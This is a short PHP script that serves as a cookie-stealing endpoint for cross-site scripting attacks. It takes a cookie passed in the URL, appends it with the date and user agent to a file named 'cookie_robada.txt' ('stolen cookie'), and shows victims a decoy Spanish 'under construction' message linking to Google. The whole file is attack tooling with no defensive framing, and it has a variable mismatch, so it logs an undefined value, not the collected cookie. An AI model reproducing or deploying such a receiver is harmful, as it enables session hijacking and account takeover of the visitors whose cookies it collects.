<?php
$collectedCookie=$HTTP_GET_VARS["cookie"];
$date=date("l ds of F Y h:i:s A");
$user_agent=$_SERVER['HTTP_USER_AGENT'];
$file=fopen('cookie_robada.txt','a');
fwrite($file,"DATE:$date || USER AGENT:$user_agent || COOKIE:$cookie \n");
fclose($file);
echo '<b>Lo sentimos, esta página está en construcción.</b></br></br>Click aquí<a
href="http://www.google.com/">here</a> para volver a la página anterior. ';
?>
 
